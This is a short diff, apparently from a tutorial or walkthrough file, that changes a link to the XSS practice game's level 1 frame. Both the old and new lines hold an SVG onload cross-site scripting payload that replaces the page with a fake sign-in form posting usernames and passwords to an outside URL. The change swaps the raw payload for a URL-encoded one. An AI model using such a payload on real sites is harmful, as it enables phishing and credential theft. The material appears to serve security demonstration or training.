@@ -34,7 +34,7 @@ https://970-cs-202608506355-default.cs-asia-southeast1-ajrg.cloudshell.dev/mini-
 =============
 
 > hello <a name='n'
-> href='https://xss-game.appspot.com/level1/frame?query=<svg/onload=document.body.innerHTML="</a></div></div></div></div></div></div></div></div></div></div></div></div><br><br><br><br><br><br><br><br><br><br><br><br><div style='background: #97e3ff; position: fixed; top: 80%; left: 50%; margin-top: -50px;  margin-left: -150px; border-style: double;'>Please sign in below:<br><form action=https://bing.com/just>username:<input type=text name=u><br>password:<input type=password name=p><br><input type=submit value='Sign in'></form><br></div>">'>*appspot*</a>\
+> href='https://xss-game.appspot.com/level1/frame?query=<svg/onload=document.body.innerHTML="%3C%2Fa%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cdiv%20style%3D%27background%3A%20%2397e3ff%3B%20position%3A%20fixed%3B%20top%3A%2080%25%3B%20left%3A%2050%25%3B%20margin-top%3A%20-50px%3B%20%20margin-left%3A%20-150px%3B%20border-style%3A%20double%3B%27%3EPlease%20sign%20in%20below%3A%3Cbr%3E%3Cform%20action%3Dhttps%3A%2F%2Fbing.com%2Fjust%3Eusername%3A%3Cinput%20type%3Dtext%20name%3Du%3E%3Cbr%3Epassword%3A%3Cinput%20type%3Dpassword%20name%3Dp%3E%3Cbr%3E%3Cinput%20type%3Dsubmit%20value%3D%27Sign%20in%27%3E%3C%2Fform%3E%3Cbr%3E%3C%2Fdiv%3E">'>*appspot*</a>\
 
 </walkthrough-html-step>
 
